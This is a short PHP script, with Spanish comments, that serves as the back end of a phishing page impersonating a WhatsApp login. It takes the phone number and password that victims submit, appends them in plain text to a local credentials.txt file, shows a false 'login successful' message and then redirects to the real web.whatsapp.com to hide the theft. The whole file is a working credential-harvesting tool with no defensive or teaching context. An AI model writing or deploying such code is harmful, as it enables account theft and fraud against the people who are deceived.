<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = $_POST['phone'];
    $password = $_POST['password'];

    // Aquí puedes guardar las credenciales en una base de datos o un archivo
    file_put_contents('credentials.txt', "Phone: $phone\nPassword: $password\n", FILE_APPEND);

    echo "Inicio de sesión exitoso. Redirigiendo...";
    header("refresh:2;url=https://web.whatsapp.com/");
}
?>
